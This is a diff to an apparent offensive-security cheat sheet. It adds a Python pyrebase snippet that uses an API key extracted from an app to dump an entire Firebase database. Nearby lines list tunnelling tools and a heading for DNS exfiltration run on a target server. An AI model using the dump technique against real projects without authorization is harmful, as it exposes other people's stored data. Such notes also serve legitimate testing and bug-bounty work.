@@ -811,6 +811,18 @@ https://github.com/sensepost/reGeorg
 https://github.com/fbkcs/ThunderDNS
 <br># This tool can forward TCP traffic over DNS protocol. Non-compile clients + socks5 support.
 
+https://blog.assetnote.io/bug-bounty/2020/02/01/expanding-attack-surface-react-native/
+<br># Extract data from Firebase with apikey.
+```
+$ pip3 install pyrebase4
+$ python3
+>>> import pyrebase
+>>> config = {"apiKey":"AIz...","authDomain":"project.firebaseapp.com","databaseURL":"https://project.firebaseio.com"...}
+>>> firebase = pyrebase.initialize_app(config)
+>>> db = firebase.database()
+>>> print(db.get())
+```
+
 <br># Pure bash exfiltration over dns
 <br>## Execute on target server (replace YOURBCID)
 ```
